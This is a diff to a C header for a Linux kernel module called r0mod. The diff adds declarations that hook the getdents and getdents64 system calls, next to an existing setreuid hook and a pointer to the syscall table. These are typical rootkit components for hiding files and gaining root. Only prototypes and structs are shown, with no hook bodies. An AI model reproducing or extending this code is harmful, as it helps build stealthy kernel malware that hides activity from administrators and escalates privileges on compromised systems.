@@ -1,5 +1,5 @@
-#ifndef _R0MOD_GLOBAL_HA
-#   define _R0MOD_GLOBAL_HA
+#ifndef _R0MOD_GLOBAL_H
+#   define _R0MOD_GLOBAL_H
 
 #   include <linux/module.h>
 #   include <linux/version.h>
@@ -12,8 +12,6 @@
 #   else
 #       include <linux/autoconf.h>
 #   endif
-
-#   define CMD_ROOT         0
 
 // Debugging definitions
 #   define __DEBUG__        1   // General debugging statements
@@ -46,18 +44,36 @@
 #       define DEBUG_RW(fmt, ...)
 #   endif
 
-extern unsigned long *sct;
+struct linux_dirent
+{
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
+};
 
-#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
-unsigned long get_symbol(char *name);
-#   endif
+struct linux_dirent64
+{
+    u64             d_ino;
+    s64             d_off;
+    unsigned short  d_reclen;
+    unsigned char   d_type;
+    char            d_name[0];
+};
+
+extern unsigned long *sct;
 
 char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
 void *memstr(const void *haystack, const char *needle, size_t size);
 
 extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
-
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid);
+
+extern asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
+extern asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
 #endif
